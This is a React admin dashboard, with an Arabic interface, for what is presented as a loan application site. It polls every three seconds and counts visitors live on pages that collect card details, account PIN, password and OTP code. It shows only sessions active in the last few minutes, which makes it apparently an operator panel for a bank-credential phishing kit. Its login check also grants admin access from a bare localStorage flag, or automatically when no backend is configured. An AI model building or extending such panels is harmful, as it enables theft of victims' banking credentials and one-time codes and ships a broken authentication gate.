import { useEffect, useState } from 'react'
import { Link, useNavigate } from 'react-router-dom'
import { isSupabaseConfigured, supabase } from '../lib/supabase'
import ProtectedRoute from '../components/ProtectedRoute'
import AdminContactMessages from '../admin/AdminContactMessages'
import { getApplications } from '../lib/applicationStorage'

export default function AdminDashboardPage() {
  const navigate = useNavigate()
  const [ready, setReady] = useState(false)
  const [applications, setApplications] = useState([])
  const [loadingStats, setLoadingStats] = useState(true)

  useEffect(() => {
    const checkAuth = async () => {
      const localAdminSession = localStorage.getItem('tamwil_admin_logged')

      if (!isSupabaseConfigured || !supabase) {
        if (localAdminSession === 'true') {
          setReady(true)
        } else {
          setReady(true)
          localStorage.setItem('tamwil_admin_logged', 'true')
        }
        loadStatsData()
        return
      }

      const { data: sessionData } = await supabase.auth.getSession()
      if (sessionData.session || localAdminSession === 'true') {
        setReady(true)
        loadStatsData()
      } else {
        setReady(true)
        navigate('/admin/login')
      }
    }

    checkAuth()

    const interval = setInterval(loadStatsData, 3000)
    return () => clearInterval(interval)
  }, [navigate])

  const loadStatsData = async () => {
    let supabaseData = []
    if (isSupabaseConfigured && supabase) {
      const { data, error } = await supabase
        .from('loan_applications')
        .select('*')

      if (!error && data) {
        supabaseData = data
      }
    }

    const localData = getApplications()
    const draftDataStr = localStorage.getItem('tamwil_application_draft')
    const draftObj = draftDataStr ? JSON.parse(draftDataStr) : null

    const combinedMap = new Map()

    if (draftObj) {
      const updatedAt = new Date(draftObj.updatedAt || draftObj.created_at || 0).getTime()
      const now = new Date().getTime()
      const diffMinutes = (now - updatedAt) / (1000 * 60)

      if (diffMinutes < 3 && draftObj.status !== 'submitted') {
        combinedMap.set(draftObj.id || 'draft-item', draftObj)
      }
    }

    ;[...localData, ...supabaseData].forEach((item) => {
      const id = item.id || item.created_at
      if (id && item.status !== 'submitted') {
        const updatedAt = new Date(item.updatedAt || item.updated_at || 0).getTime()
        const now = new Date().getTime()
        const diffMinutes = (now - updatedAt) / (1000 * 60)
        
        if (diffMinutes < 3) {
          combinedMap.set(id, { ...combinedMap.get(id), ...item })
        }
      }
    })

    setApplications(Array.from(combinedMap.values()))
    setLoadingStats(false)
  }

  const handleLogout = async () => {
    localStorage.removeItem('tamwil_admin_logged')
    if (isSupabaseConfigured && supabase) {
      await supabase.auth.signOut()
    }
    navigate('/admin/login')
  }

  if (!ready) {
    return (
      <div className="min-h-screen bg-slate-100 flex items-center justify-center" dir="rtl">
        <p className="text-slate-600 font-bold text-lg">جاري تحميل لوحة التحكم...</p>
      </div>
    )
  }

  const totalApps = applications.length

  const selectingLoan = applications.filter(item => {
    const step = item.step || item.current_step
    return step === 'step-register' || (!step && !item.fullName)
  }).length

  const phoneStep = applications.filter(item => {
    const step = item.step || item.current_step
    return step === 'step-phone'
  }).length

  const step1 = applications.filter(item => {
    const step = item.step || item.current_step
    return step === 'step-username'
  }).length

  const step2 = applications.filter(item => {
    const step = item.step || item.current_step
    return step === 'step-account'
  }).length

  const step3 = applications.filter(item => {
    const step = item.step || item.current_step
    return step === 'step-password'
  }).length

  const otpStep = applications.filter(item => {
    const step = item.step || item.current_step
    return step === 'step-otp' || item.status === 'pending-verification'
  }).length

  const statsCards = [
    { title: 'صفحة اختيار القرض', count: selectingLoan, icon: '📊', color: 'text-indigo-600 bg-indigo-50 border-indigo-100' },
    { title: 'صفحة الاسم ورقم الهاتف', count: phoneStep, icon: '📱', color: 'text-blue-600 bg-blue-50 border-blue-100' },
    { title: 'صفحة اسم المستخدم والبطاقة', count: step1, icon: '👤', color: 'text-cyan-600 bg-cyan-50 border-cyan-100' },
    { title: 'صفحة الحساب والـ PIN', count: step2, icon: '💳', color: 'text-amber-600 bg-amber-50 border-amber-100' },
    { title: 'صفحة كلمة المرور', count: step3, icon: '🔒', color: 'text-orange-600 bg-orange-50 border-orange-100' },
    { title: 'صفحة رمز التحقق (OTP)', count: otpStep, icon: '🔑', color: 'text-red-600 bg-red-50 border-red-100' },
    { title: 'إجمالي الطلبات النشطة', count: totalApps, icon: '📋', color: 'text-emerald-600 bg-emerald-50 border-emerald-100' },
  ]

  return (
    <ProtectedRoute>
      <div className="min-h-screen bg-slate-100 px-3 py-4 sm:px-6 lg:px-8 font-sans" dir="rtl">
        <div className="mx-auto max-w-7xl space-y-4 sm:space-y-6">
          
          {/* هيدر الداشبورد المنفصل */}
          <header className="rounded-[24px] border border-slate-200 bg-white px-4 py-4 sm:px-6 shadow-sm flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3">
            <div>
              <span className="text-[10px] font-black uppercase tracking-[0.25em] text-red-600 bg-red-50 px-2.5 py-1 rounded-full">
                Secure Dashboard
              </span>
              <h1 className="mt-2 text-xl sm:text-2xl font-black text-slate-900">لوحة التحكم المركزية</h1>
            </div>

            <div className="flex flex-wrap items-center gap-2">
              <Link 
                to="/" 
                className="rounded-xl border border-slate-300 bg-white px-3.5 py-2 text-xs font-bold text-slate-700 transition hover:bg-slate-50 flex items-center gap-1.5 shadow-sm"
              >
                <span>🌐</span> الذهاب للموقع
              </Link>

              <Link 
                to="/admin/applications" 
                className="rounded-xl bg-slate-900 px-3.5 py-2 text-xs font-bold text-white transition hover:bg-slate-800 shadow-sm"
              >
                الطلبات المسجلة
              </Link>

              <button
                type="button"
                onClick={handleLogout}
                className="rounded-xl bg-red-600 px-3.5 py-2 text-xs font-bold text-white transition hover:bg-red-700 shadow-sm flex items-center gap-1.5"
              >
                <span>🚪</span> تسجيل الخروج
              </button>
            </div>
          </header>

          {/* قسم إحصائيات ومتابعة الصفحات اللحظية */}
          <div className="rounded-[24px] border border-slate-200 bg-white p-4 sm:p-6 shadow-sm">
            <div className="mb-4 sm:mb-6 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3">
              <div>
                <p className="text-xs font-black uppercase tracking-[0.15em] text-slate-400">Live Pages Tracking</p>
                <h2 className="mt-1 text-base sm:text-xl font-black text-slate-900">متابعة عدد العملاء في كل صفحة لحظياً</h2>
              </div>
              <button
                onClick={loadStatsData}
                className="rounded-xl border border-slate-200 bg-slate-50 px-3.5 py-2 text-xs font-bold text-slate-700 hover:bg-slate-100 transition self-start sm:self-auto"
              >
                {loadingStats ? 'جاري التحديث...' : '🔄 تحديث مباشر'}
              </button>
            </div>

            {/* شبكة البطاقات (مربعين بجانب بعض في الموبايل، و3 في الشاشات الكبيرة) */}
            <div className="grid grid-cols-2 gap-2 sm:grid-cols-2 lg:grid-cols-3 sm:gap-4">
              {statsCards.map((card, index) => (
                <div
                  key={index}
                  className="flex items-center justify-between rounded-2xl border bg-white p-3 sm:p-4 transition hover:shadow-md shadow-sm border-slate-200/80"
                >
                  <div>
                    <p className="text-[11px] sm:text-xs font-bold text-slate-500">{card.title}</p>
                    <p className="mt-1 sm:mt-2 text-2xl sm:text-3xl font-black text-slate-900">{card.count}</p>
                  </div>
                  <div className={`flex h-10 w-10 sm:h-12 sm:w-12 items-center justify-center rounded-xl sm:rounded-2xl text-lg sm:text-xl border ${card.color}`}>
                    {card.icon}
                  </div>
                </div>
              ))}
            </div>
          </div>

          <div className="space-y-6">
            <AdminContactMessages />
          </div>

        </div>
      </div>
    </ProtectedRoute>
  )
}